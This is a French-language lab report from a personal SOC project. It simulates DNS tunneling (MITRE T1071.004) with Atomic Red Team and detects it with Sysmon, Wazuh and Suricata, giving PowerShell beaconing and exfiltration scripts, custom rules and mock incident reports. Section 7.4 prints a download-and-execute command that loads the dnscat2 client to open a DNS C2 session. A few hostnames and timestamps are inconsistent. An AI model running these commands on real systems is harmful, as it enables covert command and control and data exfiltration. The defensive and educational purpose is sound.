# Rapport de Projet — Atomic Red Team : T1071.004 (DNS Tunneling)
## Simulation d'attaque et détection SOC avec Sysmon & Wazuh

**Auteur :** Grim Jow (Analyste : Ghraba Youssef)
**Dates :** 6 — 11 octobre 2026
**Cadre du projet :** Apprentissage pratique de la détection SOC via le framework **Atomic Red Team**, appliqué à la technique **MITRE ATT&CK T1071.004 — Application Layer Protocol: DNS**.

> Ce projet est indépendant des précédents travaux de laboratoire (construction d'infrastructure Wazuh/OPNsense/Ansible). Il s'agit ici d'une démarche d'apprentissage ciblée, centrée sur un unique framework de tests offensifs reconnus (Atomic Red Team) et sur la méthodologie d'un analyste SOC face à une technique de Command & Control.

---

## 1. Objectif du projet

**Atomic Red Team** est une bibliothèque de tests offensifs ("atomics") maintenue par Red Canary, mappés sur la matrice **MITRE ATT&CK**. Chaque test reproduit une action technique précise utilisée par de vrais attaquants, dans un cadre contrôlé, pour permettre aux équipes de sécurité de valider leurs capacités de détection.

Ce projet se concentre sur la technique **T1071.004 (DNS Tunneling)**, déclinée en quatre tests atomiques progressifs :

| Test | Nom | Statut |
|---|---|---|
| #1 | High Volume DNS Requests | ✅ Réalisé |
| #2 | Balise DNS régulière (Beaconing) | ✅ Réalisé |
| #3 | Requête DNS à domaine long (Data Exfiltration) | ✅ Réalisé |
| #4 | Session DNS C2 complète (dnscat2) | 🔜 À réaliser |

**Objectif pédagogique :** comprendre, pour chaque variante de la technique, comment un attaquant l'exploite, puis comment un analyste SOC la détecte, la trie et la documente — de la simulation de l'attaque jusqu'au rapport d'incident formel.

---

## 2. Environnement de test

```
┌──────────────────────────────────────────────────────────────┐
│                   LABO SOC - ARCHITECTURE                     │
├──────────────────────────────────────────────────────────────┤
│  Arch Linux (Attaquant)     │ 192.168.56.50 │ Outils Kali     │
│  Rocky Linux (Wazuh Mgr)    │ 192.168.56.10 │ SIEM            │
│  OPNsense (Firewall)        │ 192.168.56.1  │ Suricata (IDS)  │
│  SERVER01-CORE (DC)         │ 192.168.56.58 │ AD DS/DNS/Kerb. │
│  WIN-CLIENT (Workstation)   │ 192.168.56.61 │ Domain-joined   │
└──────────────────────────────────────────────────────────────┘
```

### 2.1 Rôle de chaque composant

| Machine | Rôle | Outils |
|---|---|---|
| SERVER01-CORE | Contrôleur de domaine (AD DS, DNS, Kerberos, LDAP) | Sysmon v15.22, Wazuh Agent 4.14.3 |
| WIN-CLIENT | Poste de travail joint au domaine (victime) | Sysmon v15.22, Wazuh Agent 4.14.3 |
| Rocky Linux | Wazuh Manager | Manager 4.14.7, règles personnalisées 100200–100300 |
| Arch Linux | Machine attaquante | Outils de type Kali |
| OPNsense | Pare-feu périmétrique | Suricata (IDS réseau) |

### 2.2 Chemin logique du trafic DNS testé

```
WIN-CLIENT  →  Requête DNS  →  SERVER01-CORE (DNS)  →  Forwarder  →  Internet public
```

### 2.3 Vérifications préalables

Avant chaque test, l'état des agents a été contrôlé sur WIN-CLIENT :

```powershell
Get-Service Sysmon64
Get-Service WazuhSvc
ipconfig /all | Select-String "DNS Servers"
```

```
Status   Name       DisplayName
------   ----       -----------
Running  Sysmon64   Sysmon64
Running  WazuhSvc   Wazuh

DNS Servers . . . . . . . . . . . : 192.168.56.58
```

✅ Les deux agents sont actifs, et le poste résout ses requêtes via le contrôleur de domaine — condition nécessaire à la capture de l'Event ID 22 (DNS Query) par Sysmon.

---

## 3. Pourquoi le DNS comme vecteur de C2 ?

```
HTTP   → ❌ bloqué par le pare-feu
HTTPS  → ❌ inspection SSL
SSH    → ❌ port fermé
DNS    → ✅ quasiment toujours ouvert
```

Le DNS étant indispensable au fonctionnement de tout réseau, il est presque systématiquement autorisé en sortie — une confiance par défaut que la technique T1071.004 détourne pour établir un canal de communication discret.

**Principe d'encodage :** une requête DNS normale (`google.com`) n'exprime qu'une intention de résolution ; un implant malveillant encode à la place des données (commandes, résultats) directement dans le sous-domaine interrogé :

```
Requête normale : google.com
Requête C2       : atomicredteam-123456.127.0.0.1.nip.io
                    └── "123456" peut contenir des données chiffrées
```

---

## 4. Test atomique #1 — High Volume DNS Requests

### 4.1 Théorie

| Paramètre | Valeur |
|---|---|
| Objectif | Envoyer un grand nombre de requêtes DNS en peu de temps |
| Scénario simulé | Exfiltration massive de données |
| Détection visée | Dépassement de seuil (threshold) |
| Indicateurs | > 50 requêtes/minute, même domaine/source, type TXT |

### 4.2 Script d'exécution

```powershell
New-Item -Path "C:\AtomicTests" -ItemType Directory -Force | Out-Null

$test1 = @'
param(
    [string]$Domain = "127.0.0.1.nip.io",
    [string]$Subdomain = "atomicredteam",
    [string]$QueryType = "TXT",
    [int]$QueryVolume = 1000
)
for($i=0; $i -le $QueryVolume; $i++) {
    $random = Get-Random -Minimum 1 -Maximum 999999
    $queryName = "$Subdomain-$random.$Domain"
    try {
        Resolve-DnsName -type $QueryType -Name $queryName -QuickTimeout -ErrorAction SilentlyContinue
    } catch {}
}
'@
$test1 | Out-File -FilePath "C:\AtomicTests\Test1-DNS-Volume.ps1" -Encoding UTF8
```

```powershell
cd C:\AtomicTests
.\Test1-DNS-Volume.ps1 -Domain "127.0.0.1.nip.io" -Subdomain "atomicredteam" -QueryType "TXT" -QueryVolume 1000
```

### 4.3 Détection — double corrélation (hôte + réseau)

| Source | Rule ID | Level | Description |
|---|---|---|---|
| Sysmon (hôte) | 100204 | 12 | Requête DNS vers TLD suspect |
| Suricata (réseau) | 100300 | 12 | Tunneling DNS détecté |

**Lecture de l'alerte HOST (Rule 100204) :**

| Champ | Valeur |
|---|---|
| Qui | server01-core (192.168.56.58) |
| Quoi | Requête DNS vers un TLD suspect (`.nip.io`) |
| Quand | 27 sept. 2026 @ 14:04:29 |
| Où | Depuis PowerShell |
| Utilisateur | Administrator |
| Occurrences | 86 déclenchements |

**Lecture de l'alerte NETWORK (Rule 100300) :**

| Champ | Valeur |
|---|---|
| Source | 192.168.56.58 (victime) |
| Destination | 192.168.56.1:53 (OPNsense — DNS Resolver) |
| Protocole | UDP/53 |
| Pattern | 75 alertes répétées |

### 4.4 Classification

```
VRAI POSITIF — DNS Tunneling confirmé
Sévérité   : CRITICAL
Technique  : T1071.004
Tactique   : Command and Control (TA0011)
Action     : Investigation immédiate
```

### 4.5 Calcul du coefficient de variation (CV) — preuve du beaconing

| Beacon | Horodatage | Intervalle |
|---|---|---|
| #1 | 14:04:29 | — |
| #2 | 14:04:59 | 30 s |
| #3 | 14:05:29 | 30 s |
| #4 | 14:05:36 | 7 s (anomalie) |

```
Moyenne    : ~28 s
Écart-type : ~3 s
CV         : 10.7 %
```

| CV | Interprétation |
|---|---|
| < 20 % | 🚨 Beaconing |
| 20–30 % | ⚠️ Suspect |
| > 30 % | ✅ Normal |

**Verdict : CV = 10.7 % → beaconing automatisé confirmé.**

### 4.6 IOCs extraits

```
Domaine   : *.127.0.0.1.nip.io
TLD       : .nip.io
Processus : powershell.exe
Compte    : SERVER01-CORE\Administrator
Pattern   : Beaconing ~30 s
Type      : Requêtes TXT
```

### 4.7 Actions immédiates (L1)

1. Documenter l'incident (ticket, IOCs, captures).
2. Escalader au L2 (DNS Tunneling + beaconing actif = priorité haute).
3. Collecter les preuves (logs Sysmon, logs Suricata, dump mémoire).
4. Bloquer temporairement `*.nip.io` sur OPNsense et investiguer `powershell.exe`.

---

## 5. Test atomique #2 — Balise DNS régulière (Beaconing)

### 5.1 Scénario narratif

```
Attaquant (type APT) → Email de phishing → Service RH
    → Compromission du poste via macro
    → Implant déployé (DNS beacon)
    → Canal C2 établi via DNS (seul protocole systématiquement ouvert)
```

### 5.2 Cycle de vie du beacon

```
[1] Attente ~30 s (± jitter)
[2] Réveil
[3] Génération d'un identifiant aléatoire
[4] Construction du nom de domaine : atomicredteam-123456.127.0.0.1.nip.io
[5] Envoi de la requête DNS (TXT)
[6] Attente de réponse
[7] Retour à [1]
```

### 5.3 Exécution (Atomic Red Team officiel)

```powershell
New-Item -ItemType Directory -Path "C:\AtomicRedTeam\T1071.004\src" -Force

Invoke-WebRequest `
  -Uri "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1071.004/src/T1071-dns-beacon.ps1" `
  -OutFile "C:\AtomicRedTeam\T1071.004\src\T1071-dns-beacon.ps1"

Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force

.\T1071-dns-beacon.ps1 `
  -Domain "127.0.0.1.nip.io" `
  -Subdomain "atomicredteam" `
  -QueryType "TXT" `
  -C2Interval 30 `
  -C2Jitter 20 `
  -RunTime 5
```

### 5.4 Comparaison Test #1 vs Test #2

| Critère | Test #1 — Volume | Test #2 — Beaconing |
|---|---|---|
| Concept | Envoyer beaucoup de requêtes | Envoyer régulièrement |
| Volume | 1000+ requêtes | 10–60 requêtes |
| Durée | 5–10 minutes | 30 min à 30 jours (réel) |
| Pattern | Rafale (burst) | Régulier + jitter |
| Détection | Seuil (threshold) | Motif temporel (CV) |
| Facilité | ✅ Facile | ❌ Difficile |
| Règle | 100203 (Level 12) | 100205–100207 (Level 12–14) |
| MITRE | T1071.004 | T1071.004 + T1571 |

### 5.5 Preuve d'exécution — Sysmon côté WIN-CLIENT

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 5 |
  Where-Object {$_.Id -eq 22} |
  Format-Table TimeCreated, @{N='Query';E={$_.Properties[4].Value}}
```

✅ Sysmon actif, Event ID 22 bien enregistré, nom de domaine suivant un pattern DGA (`atomicredteam` + nombre aléatoire), processus source `powershell.exe`.

### 5.6 Preuve JSON — alerte Wazuh (Rule 100204)

```json
"rule": {
  "id": "100204",
  "level": 12,
  "firedtimes": 12,
  "description": "CRITICAL: DNS query to suspicious TLD: atomicredteam.820315.127.0.0.1.nip.io",
  "mitre": { "technique": ["DNS"], "id": ["T1071.004"], "tactic": ["Command and Control"] }
},
"data": {
  "win": {
    "eventdata": {
      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "queryName": "atomicredteam.820315.127.0.0.1.nip.io",
      "queryStatus": "9501",
      "user": "WIN-CLIENT\\windows",
      "processId": "7068"
    }
  }
}
```

| Champ | Valeur | Signification SOC |
|---|---|---|
| `rule.id` | 100204 | Règle personnalisée |
| `rule.level` | 12 | 🔴 Critique |
| `rule.mitre.id` | T1071.004 | Technique identifiée |
| `agent.name` | WIN-CLIENT | Machine infectée |
| `image` | powershell.exe | Processus suspect |
| `queryName` | atomicredteam.665851.127.0.0.1.nip.io | Pattern DGA |

### 5.7 Chronologie complète de l'attaque (Dashboard Wazuh)

| Heure | Règle | Description | Level |
|---|---|---|---|
| 19:29:21 | 67028 | Privilèges spéciaux attribués | 3 |
| 19:29:21 | 60200 | Connexion réseau en clair | 3 |
| 19:29:22 | 92032 | Exécution suspecte shell cmd | 3 |
| 19:29:23 | 92052 | Invite de commande lancée | 4 |
| 19:29:27 | 100204 | 1er beacon DNS | 12 |
| 19:29:54 | 100204 | 2e beacon DNS (+30 s) | 12 |
| 19:30:23 | 100204 | 3e beacon DNS (+29 s) | 12 |
| 19:30:54 | 100204 | 4e beacon DNS (+31 s) | 12 |
| 19:31:28 | 100204 | 5e beacon DNS (+34 s) | 12 |
| 19:31:54 | 100204 | 6e beacon DNS (+26 s) | 12 |

**Kill chain reconstituée :**

```
Élévation de privilèges (67028)
      ↓
Exécution de commande (92032, 92052)
      ↓
DNS Beaconing (100204 × 6)
```

### 5.8 Validation de la non-propagation

| Indicateur | WIN-CLIENT (agent 013) | SERVER01-CORE (agent 014) |
|---|---|---|
| Rule 100204 | ✅ 6+ alertes | ❌ 0 alerte |
| Rule 92052 | ✅ 2 alertes | ❌ 0 alerte |
| Logon/Logoff | Normaux | Normaux |
| **Verdict** | 🔴 **Infecté** | ✅ **Sain** |

**Point clé :** sur ses 2 361 alertes totales, SERVER01-CORE n'en présente aucune de type `100204` ou `92052`. Il n'a fait que **relayer** passivement les requêtes DNS de WIN-CLIENT — preuve de l'absence de propagation au contrôleur de domaine.

### 5.9 Méthodologie SOC appliquée — Triage (0–5 min)

```
Rule ID     : 100204
Level       : 12
Agent       : WIN-CLIENT (013)
Période     : 19:29 – 19:31 UTC
```

| Question | Réponse |
|---|---|
| Vrai positif ? | ✅ Oui (pattern DGA + type TXT + intervalle régulier) |
| Sévérité ? | 🔴 Critique (Level 12) |
| Impact ? | WIN-CLIENT compromis |
| Propagation ? | ❌ Non (SERVER01-CORE sain) |
| Urgent ? | ✅ Oui (communication C2 active) |

**Verdict de triage : escalade immédiate au niveau L2.**

### 5.10 Rapport d'incident formel — SOC-2026-1006-003

```
Date            : 06/10/2026
Heure           : 19:29 – 19:32 UTC
Analyste        : Ghraba Youssef
Sévérité        : CRITIQUE
```

**Résumé exécutif :** WIN-CLIENT (192.168.56.61) infecté par un implant simulant un C2, utilisant le DNS Beaconing avec un algorithme DGA pour communiquer via des requêtes TXT à intervalles réguliers (~30 s).

**IOCs :**

```
Domain pattern : atomicredteam.<6 chiffres>.127.0.0.1.nip.io
Type requête   : TXT
Intervalle     : 30 s (± 20 % jitter)
Processus      : powershell.exe (PID 7068, parent PID 2856)
Ligne de cmd   : -ExecutionPolicy Bypass
Hôte           : WIN-CLIENT (192.168.56.61) — Windows 10 Enterprise LTSC 2021
```

**Analyse technique :**
- **Pattern DGA :** sous-domaines aléatoires à chaque requête, empêchant le blocage par liste noire.
- **Type TXT :** rare en trafic normal, classique pour les C2.
- **Intervalle régulier :** caractéristique d'un beacon automatisé plutôt que d'un comportement humain.
- **Processus suspect :** `-ExecutionPolicy Bypass`, indicateur classique de malware.

**Scope :** infecté → WIN-CLIENT uniquement. Sains → SERVER01-CORE, Rocky Linux, OPNsense. **Aucune propagation.**

**Recommandations :**

| Urgence | Action |
|---|---|
| 🔴 Immédiat | Isoler WIN-CLIENT ; bloquer `*.127.0.0.1.nip.io` ; investiguer PID 7068 |
| 🟠 Court terme | Analyse mémoire (Volatility) ; vérifier la persistance ; scanner les autres postes |
| 🟡 Long terme | Règle Wazuh dédiée aux requêtes TXT ; DNS Sinkhole ; sensibilisation utilisateurs |

**Leçons apprises :** la règle 100204 a fonctionné ; la corrélation multi-source est essentielle ; l'état sain de SERVER01-CORE confirme l'absence de propagation ; le jitter ne suffit pas à masquer le pattern.

---

## 6. Test atomique #3 — Requête DNS à domaine long (Data Exfiltration)

### 6.1 Principe

Le contenu caché est placé dans le nom de domaine lui-même, que le pare-feu lit sans en comprendre la signification :

```
Requête normale   : google.com                                   (~11 caractères)
Requête exfiltrée : dGhpcy1pcy1zZWNyZXQtZGF0YQ==.evil-c2.com      (Base64 encodé)
```

### 6.2 Pourquoi 63 caractères ?

C'est la limite maximale d'un label DNS selon la **RFC 1035**. Les attaquants s'en approchent pour maximiser la bande passante de leur canal caché (jusqu'à ~250 octets dissimulés par requête), sachant qu'un serveur DNS peut absorber des milliers de requêtes/minute.

### 6.3 Comparaison des trois tests

| Critère | Test #1 (Volume) | Test #2 (Beaconing) | Test #3 (Domaine long) |
|---|---|---|---|
| Objectif | Inonder | Connexion régulière discrète | Exfiltration de données |
| Nb. requêtes | Élevé (1000+) | Régulier (60) | Moyen (~63) |
| Taille des noms | Normale | Normale | Croissante jusqu'à 63 |
| Détection | Seuil (count) | Motif (temps/CV) | Longueur |
| MITRE | T1071.004 | T1071.004 | T1071.004 (Data Exfiltration) |

### 6.4 Script de simulation

```powershell
$scriptContent = @'
param(
    [string]$Domain = "127.0.0.1.nip.io",
    [string]$Subdomain = "AtomicTeamCredTeamCredeTiCredeT",
    [string]$QueryType = "TXT"
)
for ($i = 1; $i -le 63; $i++) {
    $longSubdomain = $Subdomain.Substring(0, [Math]::Min($i, $Subdomain.Length))
    if ($i -gt $Subdomain.Length) {
        $longSubdomain = $Subdomain + ("A" * ($i - $Subdomain.Length))
    }
    $queryName = "$longSubdomain.$Domain"
    Resolve-DnsName -Name $queryName -Type $QueryType -QuickTimeout -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 500
}
'@
```

```powershell
.\T1071-dns-domain-length.ps1 -Domain "127.0.0.1.nip.io" -Subdomain "AtomicTeamCredTeamCredeTiCredeT" -QueryType "TXT"
```

### 6.5 Preuve de la progression linéaire

```
[1/63]  Length=18 : A.127.0.0.1.nip.io
[10/63] Length=27 : AtomicTeam.127.0.0.1.nip.io
[31/63] Length=48 : AtomicTeamCredTeamCredeTiCredeT.127.0.0.1.nip.io
[46/63] Length=63 : AtomicTeamCredTeamCredeTiCredeTAAAAAAAAAAAAAAA.127.0.0.1.nip.io
[63/63] Length=80 : AtomicTeamCredTeamCredeTiCredeTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.127.0.0.1.nip.io
```

✅ Croissance linéaire confirmée de 18 à 80 caractères sur 63 requêtes.

### 6.6 Détection côté Wazuh — preuve

**Volume :** 32 alertes en ~20 secondes, toutes de type `100204` (Level 12), toutes rattachées à GAGNANT-CLIENT.

| Heure | Règle | Description | Level |
|---|---|---|---|
| 22:05:17 | 100204 | DNS query TLD suspect | 12 |
| 22:05:26 | 100204 | DNS query TLD suspect | 12 |
| 22:05:31 | 100204 | DNS query TLD suspect | 12 |
| 22:05:36 | 100204 | DNS query TLD suspect | 12 |

**Corrélation avec les longueurs Sysmon :**

| Heure | Requête | Longueur |
|---|---|---|
| 15:05:23 | AtomicTeamCredTeamCrede...127.0.0.1.nip.io | 40 |
| 15:05:30 | ...CredTeamCredeTiCred...127.0.0.1.nip.io | 46 |
| 15:05:35 | ...CredeTiCredeTA...127.0.0.1.nip.io | 49 |

✅ **Verdict SOC :** longueur croissante confirmée, processus `powershell.exe`, utilisateur `WIN-CLIENT\windows`, `queryStatus: 9501` (aucun enregistrement — comportement typique d'un domaine C2 fictif).

### 6.7 Preuve JSON

```json
"rule": {
  "id": "100202",
  "level": 10,
  "firedtimes": 63,
  "description": "HIGH: Long DNS query detected: AtomicTeamCredTeamCredeTiCredeTAAAA...A.127.0.0.1.nip.io",
  "mitre": { "technique": ["DNS"], "id": ["T1071.004"], "tactic": ["Command and Control"] }
},
"data": {
  "win": {
    "eventdata": {
      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "queryName": "AtomicTeamCredTeamCredeTiCredeTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.127.0.0.1.nip.io",
      "queryStatus": "9501",
      "user": "WIN-CLIENT\\windows"
    }
  }
}
```

| Champ | Valeur | Signification SOC |
|---|---|---|
| `agent.name` | WIN-CLIENT | Machine infectée |
| `image` | powershell.exe | Processus suspect |
| `queryStatus` | 9501 | Aucun enregistrement (C2 en idle) |
| `queryName` | ...63 caractères... .127.0.0.1.nip.io | Pattern DGA long |
| `rule.id` | 100202 | Règle de détection |
| `mitre.id` | T1071.004 | Technique MITRE |

### 6.8 Validation du vrai positif

```
✅ Pattern DGA
✅ Type TXT
✅ Intervalle régulier
✅ Processus suspect (powershell.exe)
✅ QueryStatus 9501

→ VRAI POSITIF — Confiance : HAUTE
```

**Les 5 questions essentielles :**

| Question | Réponse |
|---|---|
| QUOI ? | DNS Beaconing / Data Exfiltration |
| QUI ? | WIN-CLIENT\windows |
| QUAND ? | 22:05 |
| OÙ ? | 192.168.56.61 |
| COMMENT ? | PowerShell + `Resolve-DnsName` |

### 6.9 Rapport d'incident formel — SOC-2026-1011-001

```
Date            : 11/10/2026
Heure           : 22:05 – 22:05:36 UTC
Analyste        : Ghraba Youssef
Sévérité        : CRITIQUE
```

**Résumé exécutif :** WIN-CLIENT a envoyé 32 requêtes DNS avec des noms de domaine anormalement longs (jusqu'à 80 caractères), suggérant une exfiltration de données via DNS Tunneling.

**Technique MITRE :** T1071.004 — sous-technique DNS Tunneling / Data Exfiltration — Command and Control — Confiance : HAUTE.

**Chronologie :** 32 requêtes en ~20 secondes (22:05:17 → 22:05:36), longueur max : 80 caractères.

**IOCs :**

```
Domain pattern : AtomicTeamCredTeamCredeTiCredeT[A]*.127.0.0.1.nip.io
Longueur       : 40 → 80 caractères (croissance linéaire)
Type           : TXT
Intervalle     : ~500 ms – 1 s
Processus      : powershell.exe (PID 1684, parent PID 2820)
Hôte           : WIN-CLIENT (192.168.56.61) — Windows 10 Enterprise LTSC 2021
```

**Analyse technique :**
- **Longueur croissante :** progression linéaire caractéristique d'un script testant la limite DNS.
- **Type TXT :** support classique de données Base64.
- **Débit estimé :** ~1,6 req/s ≈ 500 octets/s de canal caché.
- **`QueryStatus 9501`** : signature d'un C2 en attente de commande.

**Scope :** infecté → WIN-CLIENT uniquement. **Aucune propagation.**

**Recommandations :**

| Urgence | Actions |
|---|---|
| 🔴 Immédiat (0–15 min) | Isoler WIN-CLIENT ; bloquer `*.127.0.0.1.nip.io` ; investiguer PID 1684 ; dump mémoire |
| 🟠 Court terme (1–24 h) | Tâches planifiées ; clés de registre `Run` ; scan des autres postes ; corrélation logs DNS du DC |
| 🟡 Long terme (1–4 semaines) | Déployer la règle 100300 ; DNS Sinkhole ; DNSSEC ; formation utilisateurs |

**Leçons apprises :** la règle 100204 a bien réagi ; le pattern long a été détecté avec succès ; nécessité confirmée d'une règle dédiée à la détection des domaines anormalement longs.

### 6.10 Règle créée suite à l'incident — Rule 100300

```xml
<rule id="100300" level="12" frequency="5" timeframe="60">
  <if_matched_sid>100200</if_matched_sid>
  <same_source_ip />
  <field name="win.eventdata.queryName">.{80,}</field>
  <description>CRITICAL: DNS Long Domain - Data Exfiltration (T1071.004)</description>
  <mitre>
    <id>T1071.004</id>
  </mitre>
</rule>
```

Cette règle corrèle les événements déjà détectés par la règle socle (`100200`) et déclenche une alerte Level 12 dès que **5 requêtes avec un nom de domaine > 80 caractères** sont observées depuis la même source en moins de 60 secondes.

---

## 7. Test atomique #4 — Session DNS C2 complète (à réaliser)

### 7.1 Description officielle du test

Contrairement aux tests précédents (simulation côté PowerShell seul), le Test #4 établit une **véritable session C2 fonctionnelle** via le protocole DNS, à l'aide de l'outil **dnscat2**.

> *"Cela tentera de lancer une session C2 en utilisant le protocole DNS. Vous devrez configurer un écouteur et créer des enregistrements DNS avant d'exécuter cette commande."*

**Références officielles :**
- [github.com/iagox86/dnscat2](https://github.com/iagox86/dnscat2) — serveur/écouteur C2 (côté attaquant)
- [github.com/lukebaggett/dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell) — client PowerShell (côté victime)

### 7.2 Métadonnées du test

| Champ | Valeur |
|---|---|
| Plateformes supportées | Windows |
| GUID Atomic Red Team | `e7bf9802-2e78-4db9-93b5-181b7bcd37d7` |

### 7.3 Paramètres d'entrée

| Nom | Description | Type | Valeur par défaut |
|---|---|---|---|
| `Domain` | Nom de domaine configuré pour pointer vers le serveur DNS où tourne l'écouteur C2 | String | `example.com` |
| `server_ip` | Adresse IP du serveur DNS hébergeant l'écouteur C2 | String | `127.0.0.1` |

### 7.4 Commande d'attaque (exécution prévue, PowerShell)

```powershell
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')
Start-Dnscat2 -Domain #{domain} -DNSServer #{server_ip}
```

### 7.5 Différence majeure avec les tests #1 à #3

| Aspect | Tests #1–#3 | Test #4 |
|---|---|---|
| Nature | Simulation unilatérale (requêtes DNS sortantes uniquement) | Session C2 bidirectionnelle réelle |
| Infrastructure requise | Aucune (domaine de test `nip.io`) | Serveur dnscat2 à déployer + enregistrements DNS à configurer |
| Interaction | Aucune réponse exploitée | Canal de commande/contrôle actif (envoi de commandes, exfiltration de résultats) |
| Réalisme | Simulation de pattern | Reproduction fidèle d'un implant C2 réel |

### 7.6 Prérequis à mettre en place avant exécution

1. **Déployer le serveur dnscat2** (`iagox86/dnscat2`) sur une machine jouant le rôle de C2 (probablement Arch Linux, déjà positionné comme attaquant dans l'architecture du lab).
2. **Configurer un enregistrement DNS** pointant le domaine de test vers l'IP du serveur dnscat2.
3. **Installer le client PowerShell dnscat2** sur WIN-CLIENT.
4. Vérifier au préalable que les règles Wazuh/Suricata existantes (100200–100300) sont toujours actives pour capturer ce nouveau trafic C2, et envisager l'ajout de règles spécifiques à la signature protocolaire de dnscat2 (entêtes et structure de paquets caractéristiques de l'outil).

**Statut : préparation documentée, exécution prévue à la prochaine session.**

---

## 8. Synthèse des règles Wazuh créées pour T1071.004

| Rule ID | Déclencheur | Level | Test associé |
|---|---|---|---|
| 100200 | Requête DNS de base vers TLD suspect (Sysmon Event ID 22) | — | Règle socle, base de corrélation |
| 100202 | Requête DNS longue détectée | 10 | Test #3 |
| 100203 | Volume élevé de requêtes (threshold) | 12 | Test #1 |
| 100204 | Requête DNS vers TLD suspect (corrélée) | 12 | Déclenchée sur les 3 tests réalisés |
| 100205–100207 | Motif de beaconing régulier (analyse CV) | 12–14 | Test #2 |
| 100300 | Domaine très long + fréquence (5 req / 60 s) | 12 | Test #3 (affinée) |
| 100300 (Suricata) | Tunneling DNS détecté côté réseau | 12 | Corrélation réseau indépendante |

---

## 9. Synthèse générale du projet (à ce stade)

| Élément | Résultat |
|---|---|
| Environnement AD déployé | ✅ SERVER01-CORE (DC) + WIN-CLIENT (domain-joined) |
| Agents Sysmon + Wazuh | ✅ Actifs sur les deux machines Windows |
| Test #1 — Volume élevé | ✅ Détecté (Rules 100204/100300, CV = 10.7 % → beaconing confirmé) |
| Test #2 — Beaconing régulier | ✅ Détecté, kill chain locale reconstituée |
| Test #3 — Domaine long | ✅ Détecté, règle 100300 créée suite à l'incident |
| Test #4 — Session C2 (dnscat2) | 🔜 Prérequis documentés, exécution à venir |
| Propagation vers le DC | ❌ Aucune sur les 3 tests réalisés |
| Rapports d'incident formalisés | ✅ 2 rapports complets (SOC-2026-1006-003, SOC-2026-1011-001) |

**Conclusion intermédiaire :** les trois premiers tests, simulant des variantes croissantes en sophistication du DNS Tunneling (volume → régularité → longueur), ont tous été détectés avec un haut niveau de confiance grâce à la corrélation hôte (Sysmon) / réseau (Suricata) / SIEM (Wazuh). Le Test #4 marquera le passage d'une simulation de pattern à une **véritable session C2 fonctionnelle**, constituant le test le plus représentatif d'une attaque réelle de cette série.

---

## 10. Prochaines étapes

1. Déployer l'infrastructure nécessaire au Test #4 (serveur dnscat2, enregistrement DNS dédié).
2. Exécuter la session C2 et documenter la détection (ou l'absence de détection, le cas échéant) par les règles existantes.
3. Si nécessaire, créer une règle Wazuh dédiée à la signature protocolaire de dnscat2.
4. Produire le rapport d'incident final de cette série de tests T1071.004.
5. Étendre l'exercice à d'autres sous-techniques de Command & Control (ex. T1071.001 HTTP/HTTPS) pour comparer les facilités/difficultés de détection entre protocoles.

---

*Rapport rédigé dans le cadre d'un projet d'apprentissage personnel autour du framework Atomic Red Team, destiné au portfolio GitHub.*
